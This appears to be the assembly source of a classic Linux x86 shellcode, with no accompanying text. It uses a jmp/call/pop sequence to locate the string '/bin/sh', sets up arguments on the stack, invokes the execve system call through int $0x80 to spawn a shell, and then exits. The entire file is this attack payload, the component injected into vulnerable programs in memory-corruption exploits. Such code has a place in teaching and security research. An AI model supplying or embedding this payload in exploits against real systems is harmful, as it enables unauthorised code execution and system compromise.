.globl main

main:
	pushl %ebp
	movl  %esp, %ebp
	subl  $0x8, %esp
	jmp   L2

L1:
	popl %esi
	movl %esi, -8(%ebp)
	movl $0x0, -4(%ebp)

	xorl %eax, %eax
	movb $0xb, %al
	movl %esi, %ebx
	leal -8(%ebp),%ecx
	leal -4(%ebp),%edx
	int $0x80

	xorl %eax, %eax
	movl %eax, %ebx
	inc  %eax
	int  $0x80

L2:
	call L1
	.string "/bin/sh"

	
